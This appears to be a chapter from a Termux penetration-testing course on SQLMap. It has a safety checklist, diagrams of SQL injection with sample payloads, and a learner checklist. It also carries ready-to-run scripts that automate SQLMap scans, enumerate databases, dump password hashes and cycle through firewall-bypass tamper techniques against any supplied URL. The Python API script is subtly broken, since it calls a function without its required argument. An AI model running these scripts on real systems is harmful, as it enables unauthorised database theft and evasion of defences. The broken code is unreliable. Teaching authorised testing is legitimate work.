### 🔒 SQLMap Safety Checklist

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      SQLMAP SAFETY CHECKLIST                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Before Testing:                                                             │
│  ☐ Written authorization obtained                                           │
│  ☐ Scope clearly defined                                                    │
│  ☐ Rules of engagement signed                                               │
│  ☐ Test window confirmed                                                    │
│  ☐ Backup strategy in place                                                 │
│                                                                              │
│  During Testing:                                                             │
│  ☐ Start with --level=1 --risk=1                                            │
│  ☐ Use --batch for non-interactive                                          │
│  ☐ Monitor for system impact                                                │
│  ☐ Limit data extraction                                                    │
│  ☐ Document all activities                                                  │
│                                                                              │
│  After Testing:                                                              │
│  ☐ Report generated                                                         │
│  ☐ Vulnerabilities explained                                                │
│  ☐ Remediation provided                                                     │
│  ☐ Test data cleaned up                                                     │
│  ☐ Findings reported responsibly                                            │
│                                                                              │
│  Emergency:                                                                  │
│  ☐ Stop testing if system unstable                                          │
│  ☐ Notify immediately if data breach                                        │
│  ☐ Document incident                                                        │
│  ☐ Preserve evidence                                                        │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📊 ARCHITECTURE DIAGRAMS

### Diagram 1: SQL Injection Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                     SQL INJECTION ATTACK FLOW                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ┌──────────────┐                                                          │
│   │   ATTACKER   │                                                          │
│   │  (SQLMap)    │                                                          │
│   └──────┬───────┘                                                          │
│          │                                                                   │
│          │ HTTP Request with Malicious Payload                              │
│          │                                                                   │
│          ▼                                                                   │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │                         WEB SERVER                                  │  │
│   │  ┌────────────────────────────────────────────────────────────────┐ │  │
│   │  │                   APPLICATION LAYER                            │ │  │
│   │  │                                                                │ │  │
│   │  │  User Input: id=1' OR '1'='1                                  │ │  │
│   │  │                    ↓                                           │ │  │
│   │  │  $query = "SELECT * FROM products WHERE id = '" + input + "'";  │ │  │
│   │  │                    ↓                                           │ │  │
│   │  │  VULNERABLE CODE (No sanitization!)                            │ │  │
│   │  └────────────────────────────────────────────────────────────────┘ │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│          │                                                                   │
│          │ SQL Query: SELECT * FROM products WHERE id = '1' OR '1'='1'      │
│          │                                                                   │
│          ▼                                                                   │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │                        DATABASE SERVER                              │  │
│   │  ┌────────────────────────────────────────────────────────────────┐ │  │
│   │  │                   DATABASE LAYER                               │ │  │
│   │  │                                                                │ │  │
│   │  │   ┌─────────────┐  ┌─────────────┐  ┌─────────────┐           │ │  │
│   │  │   │   users     │  │  products   │  │   orders    │           │ │  │
│   │  │   │─────────────│  │─────────────│  │─────────────│           │ │  │
│   │  │   │ id, name,   │  │ id, name,   │  │ id, user_id │           │ │  │
│   │  │   │ email, pass │  │ price, desc │  │ total, date │           │ │  │
│   │  │   └─────────────┘  └─────────────┘  └─────────────┘           │ │  │
│   │  └────────────────────────────────────────────────────────────────┘ │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│          │                                                                   │
│          │ Data Exfiltration                                                 │
│          ▼                                                                   │
│   ┌──────────────┐                                                          │
│   │  SENSITIVE   │                                                          │
│   │    DATA      │                                                          │
│   │ (Compromised)│                                                          │
│   └──────────────┘                                                          │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Diagram 2: SQLMap Detection Process

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SQLMAP DETECTION PROCESS                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                        PHASE 1: RECONNAISSANCE                       │   │
│   │  ┌─────────────────────────────────────────────────────────────┐   │   │
│   │  │  • URL parsing                                             │   │   │
│   │  │  • Parameter identification                                │   │   │
│   │  │  • Cookie/Header analysis                                  │   │   │
│   │  └─────────────────────────────────────────────────────────────┘   │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                      │                                       │
│                                      ▼                                       │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                     PHASE 2: FUZZING                                │   │
│   │  ┌─────────────────────────────────────────────────────────────┐   │   │
│   │  │  • Inject various payloads                                  │   │   │
│   │  │  • ' OR '1'='1, " OR "1"="1, ') OR ('1'='1                 │   │   │
│   │  │  • Monitor response differences                             │   │   │
│   │  └─────────────────────────────────────────────────────────────┘   │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                      │                                       │
│                                      ▼                                       │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                   PHASE 3: TECHNIQUE IDENTIFICATION                 │   │
│   │  ┌─────────────────────────────────────────────────────────────┐   │   │
│   │  │   Test for:                                                 │   │   │
│   │  │   • Error-based  (SQL errors in response)                   │   │   │
│   │  │   • Union-based (UNION SELECT works)                        │   │   │
│   │  │   • Boolean-based (True/False responses differ)             │   │   │
│   │  │   • Time-based   (Response delays occur)                    │   │   │
│   │  └─────────────────────────────────────────────────────────────┘   │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                      │                                       │
│                                      ▼                                       │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                    PHASE 4: DATABASE FINGERPRINT                    │   │
│   │  ┌─────────────────────────────────────────────────────────────┐   │   │
│   │  │   Identify:                                                  │   │   │
│   │  │   • Database type (MySQL, PostgreSQL, MSSQL, etc.)          │   │   │
│   │  │   • Version                                                  │   │   │
│   │  │   • User privileges                                          │   │   │
│   │  └─────────────────────────────────────────────────────────────┘   │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                      │                                       │
│                                      ▼                                       │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                     PHASE 5: EXPLOITATION                           │   │
│   │  ┌─────────────────────────────────────────────────────────────┐   │   │
│   │  │   • Enumerate databases                                     │   │   │
│   │  │   • Enumerate tables                                        │   │   │
│   │  │   • Extract columns                                         │   │   │
│   │  │   • Dump data                                               │   │   │
│   │  │   • File operations (if privileged)                         │   │   │
│   │  └─────────────────────────────────────────────────────────────┘   │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Diagram 3: SQLMap vs Manual Testing Comparison

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                  SQLMAP VS MANUAL TESTING                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ┌───────────────────────────────────┐  ┌───────────────────────────────┐  │
│   │           SQLMap                  │  │       MANUAL TESTING          │  │
│   │          (Automated)               │  │      (Human Expertise)        │  │
│   ├───────────────────────────────────┤  ├───────────────────────────────┤  │
│   │                                   │  │                               │  │
│   │  ✓ Fast (1000s of payloads/sec)   │  │ ✓ Deep understanding          │  │
│   │  ✓ Comprehensive coverage         │  │ ✓ Custom bypass techniques    │  │
│   │  ✓ Multiple techniques auto       │  │ ✓ WAF bypass creativity       │  │
│   │  ✓ Automatic fingerprint          │  │ ✓ Business logic flaws        │  │
│   │  ✓ Session management             │  │ ✓ False positive verification │  │
│   │  ✓ Resume capability              │  │ ✓ Documentation skills        │  │
│   │  ✗ May trigger WAF/IDS            │  │ ✓ Complex scenarios           │  │
│   │  ✗ Can miss logic flaws           │  │ ✗ Time consuming              │  │
│   │  ✗ Generic payloads               │  │ ✗ Human error possible        │  │
│   │  ✗ May overload target            │  │ ✗ Limited coverage            │  │
│   │                                   │  │                               │  │
│   └───────────────────────────────────┘  └───────────────────────────────┘  │
│                                                                              │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                     RECOMMENDED APPROACH                            │   │
│   │                                                                      │   │
│   │   1. Manual reconnaissance → Understand the application              │   │
│   │   2. SQLMap automated scan → Quick vulnerability identification     │   │
│   │   3. Manual exploitation → Bypass WAF, complex scenarios            │   │
│   │   4. SQLMap exploitation → Data extraction if manual fails          │   │
│   │   5. Manual verification → Confirm findings                         │   │
│   │                                                                      │   │
│   │   COMBINATION = BEST RESULTS                                         │   │
│   │                                                                      │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 🏆 BONUS ADVANCED CONTENT

### Advanced Technique 1: SQLMap API Automation

```python
#!/usr/bin/env python3
"""
SQLMap API Automation Script
Uses SQLMap's REST API for automated scanning
"""

import requests
import json
import time

SQLMAP_API_URL = "http://127.0.0.1:8775"

def start_sqlmap_api():
    """Start SQLMap API server"""
    import subprocess
    subprocess.Popen(["python", "sqlmapapi.py", "-s"])
    time.sleep(3)

def create_scan_task(target_url):
    """Create a new scan task"""
    endpoint = f"{SQLMAP_API_URL}/task/new"
    response = requests.get(endpoint)
    return response.json()["taskid"]

def start_scan(task_id, target_url, options=None):
    """Start scanning with given options"""
    endpoint = f"{SQLMAP_API_URL}/scan/{task_id}/start"
    
    data = {
        "url": target_url,
        "level": 3,
        "risk": 1,
        "batch": True
    }
    
    if options:
        data.update(options)
    
    response = requests.post(endpoint, json=data)
    return response.json()

def get_scan_status(task_id):
    """Check scan status"""
    endpoint = f"{SQLMAP_API_URL}/scan/{task_id}/status"
    response = requests.get(endpoint)
    return response.json()

def get_scan_results(task_id):
    """Get scan results"""
    endpoint = f"{SQLMAP_API_URL}/scan/{task_id}/data"
    response = requests.get(endpoint)
    return response.json()

def run_automated_scan(target_url):
    """Run complete automated scan"""
    print(f"[*] Starting scan for: {target_url}")
    
    # Create task
    task_id = create_scan_task()
    print(f"[+] Task ID: {task_id}")
    
    # Start scan
    result = start_scan(task_id, target_url)
    print(f"[+] Scan started: {result}")
    
    # Monitor progress
    while True:
        status = get_scan_status(task_id)
        print(f"[*] Status: {status['status']}")
        
        if status['status'] == 'terminated':
            break
        
        time.sleep(5)
    
    # Get results
    results = get_scan_results(task_id)
    print("[+] Scan Results:")
    print(json.dumps(results, indent=2))
    
    return results

if __name__ == "__main__":
    target = "http://target.com/page?id=1"
    run_automated_scan(target)
```

### Advanced Technique 2: SQLMap + Burp Suite Integration

```bash
#!/bin/bash
# SQLMap + Burp Suite Integration Script
# Automates SQL injection testing from Burp requests

BURP_REQUEST_FILE=$1
OUTPUT_DIR="sqlmap_results_$(date +%Y%m%d_%H%M%S)"

mkdir -p $OUTPUT_DIR

echo "=== SQLMap + Burp Integration ==="

# Function to run SQLMap with different techniques
run_sqlmap() {
    local technique=$1
    local output_file=$2
    
    echo "[*] Testing with technique: $technique"
    
    sqlmap -r $BURP_REQUEST_FILE \
           --technique=$technique \
           --batch \
           --level=3 \
           --risk=1 \
           --threads=4 \
           -o $output_file \
           2>&1 | tee "$OUTPUT_DIR/sqlmap_${technique}.log"
}

# Test all techniques
for tech in B E U S T; do
    run_sqlmap $tech "$OUTPUT_DIR/results_${tech}.txt"
done

# If vulnerable, enumerate
if grep -q "Parameter.*appears to be injectable" $OUTPUT_DIR/*.log; then
    echo "[!] SQL Injection detected!"
    echo "[*] Enumerating databases..."
    
    sqlmap -r $BURP_REQUEST_FILE \
           --dbs \
           --batch \
           --threads=4 \
           2>&1 | tee "$OUTPUT_DIR/databases.txt"
    
    echo "[*] Checking for password hashes..."
    sqlmap -r $BURP_REQUEST_FILE \
           --passwords \
           --batch \
           2>&1 | tee "$OUTPUT_DIR/passwords.txt"
fi

echo "[+] Results saved in: $OUTPUT_DIR"
```

### Advanced Technique 3: Advanced WAF Bypass Techniques

```bash
#!/bin/bash
# Advanced WAF Bypass Script for SQLMap
# Multiple bypass techniques with automatic selection

TARGET_URL=$1

echo "=== SQLMap WAF Bypass Script ==="

# Technique 1: Standard tamper scripts
test_standard_tamper() {
    echo "[*] Testing standard tamper scripts..."
    
    sqlmap -u "$TARGET_URL" \
           --tamper=space2comment \
           --batch --level=1 --risk=1 \
           2>&1 | grep -i "injectable"
    
    if [ $? -eq 0 ]; then
        echo "[+] SUCCESS: space2comment tamper works!"
        return 0
    fi
}

# Technique 2: Combined tampers
test_combined_tamper() {
    echo "[*] Testing combined tamper scripts..."
    
    sqlmap -u "$TARGET_URL" \
           --tamper=space2comment,between,randomcase \
           --batch --level=2 --risk=1 \
           2>&1 | grep -i "injectable"
    
    if [ $? -eq 0 ]; then
        echo "[+] SUCCESS: Combined tampers work!"
        return 0
    fi
}

# Technique 3: HTTP Parameter Pollution
test_hpp() {
    echo "[*] Testing HTTP Parameter Pollution..."
    
    # Add duplicate parameters
    MODIFIED_URL="${TARGET_URL}&id=1"
    
    sqlmap -u "$MODIFIED_URL" \
           --batch --level=2 \
           2>&1 | grep -i "injectable"
    
    if [ $? -eq 0 ]; then
        echo "[+] SUCCESS: HPP bypass works!"
        return 0
    fi
}

# Technique 4: Case variation
test_case_variation() {
    echo "[*] Testing case variation..."
    
    sqlmap -u "$TARGET_URL" \
           --tamper=randomcase \
           --batch \
           2>&1 | grep -i "injectable"
    
    if [ $? -eq 0 ]; then
        echo "[+] SUCCESS: Case variation works!"
        return 0
    fi
}

# Technique 5: Encoding bypass
test_encoding() {
    echo "[*] Testing encoding bypass..."
    
    sqlmap -u "$TARGET_URL" \
           --tamper=charencode \
           --batch \
           2>&1 | grep -i "injectable"
    
    if [ $? -eq 0 ]; then
        echo "[+] SUCCESS: Encoding bypass works!"
        return 0
    fi
}

# Technique 6: Chunked encoding
test_chunked() {
    echo "[*] Testing chunked encoding..."
    
    sqlmap -u "$TARGET_URL" \
           --chunked \
           --batch \
           2>&1 | grep -i "injectable"
    
    if [ $? -eq 0 ]; then
        echo "[+] SUCCESS: Chunked encoding works!"
        return 0
    fi
}

# Technique 7: Time-based with delay
test_time_based() {
    echo "[*] Testing time-based with delay..."
    
    sqlmap -u "$TARGET_URL" \
           --technique=T \
           --time-sec=10 \
           --delay=2 \
           --batch \
           2>&1 | grep -i "injectable"
    
    if [ $? -eq 0 ]; then
        echo "[+] SUCCESS: Time-based works!"
        return 0
    fi
}

# Run all techniques
for func in test_standard_tamper test_combined_tamper test_hpp test_case_variation test_encoding test_chunked test_time_based; do
    $func
    if [ $? -eq 0 ]; then
        echo "[+] WAF BYPASSED!"
        exit 0
    fi
done

echo "[-] All techniques failed. Manual testing required."
```

---

## 📝 CHAPTER SUMMARY CHECKLIST

### Knowledge Verification Checklist

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      CHAPTER 34 COMPLETION CHECKLIST                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  CORE CONCEPTS:                                                              │
│  ☐ Understood SQL injection fundamentals                                   │
│  ☐ Learned injection types (In-band, Blind, Out-of-band)                   │
│  ☐ Installed SQLMap in Termux                                              │
│  ☐ Mastered basic SQLMap commands                                          │
│                                                                              │
│  ENUMERATION:                                                               │
│  ☐ Listed databases with --dbs                                              │
│  ☐ Listed tables with --tables                                              │
│  ☐ Listed columns with --columns                                            │
│  ☐ Dumped data with --dump                                                  │
│                                                                              │
│  ADVANCED OPTIONS:                                                           │
│  ☐ Used --level and --risk appropriately                                   │
│  ☐ Tested POST requests with --data                                         │
│  ☐ Used --cookies for authenticated testing                                │
│  ☐ Applied tamper scripts for WAF bypass                                   │
│  ☐ Tested with request files (-r)                                           │
│                                                                              │
│  TECHNIQUES:                                                                 │
│  ☐ Tested Boolean-based blind                                              │
│  ☐ Tested Time-based blind                                                 │
│  ☐ Tested Union-based                                                      │
│  ☐ Tested Error-based                                                      │
│  ☐ Combined techniques with --technique                                     │
│                                                                              │
│  PRACTICAL SKILLS:                                                           │
│  ☐ Set up vulnerable lab environment                                       │
│  ☐ Practiced on DVWA/bWAPP                                                 │
│  ☐ Performed database enumeration                                          │
│  ☐ Extracted sensitive data                                                │
│  ☐ Documented findings                                                     │
│                                                                              │
│  SECURITY AWARENESS:                                                         │
│  ☐ Understood legal implications                                           │
│  ☐ Know ethical testing guidelines                                         │
│  ☐ Can recommend SQL injection prevention                                   │
│  ☐ Understand responsible disclosure                                       │
│                                                                              │
│  FINAL ASSESSMENT:                                                           │
│  ☐ Completed all quiz questions                                             │
│  ☐ Reviewed interview questions                                             │
│  ☐ Understood real-world scenarios                                          │
│  ☐ Ready for Chapter 35: Metasploit                                        │
│                                                                              │
│  SCORE: _____/25 items completed                                            │
│                                                                              │
│  Next Steps:                                                                 │
│  • Practice on vulnerable apps                                              │
│  • Set up local test environment                                           │
│  • Try WAF bypass techniques                                                │
│  • Document your methodology                                                │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

**Chapter 34: SQLMap Basics - Complete! 🎉**

*Enhanced content added for comprehensive learning experience*
*Created by T3rmuxk1ng | Termux Full Course*
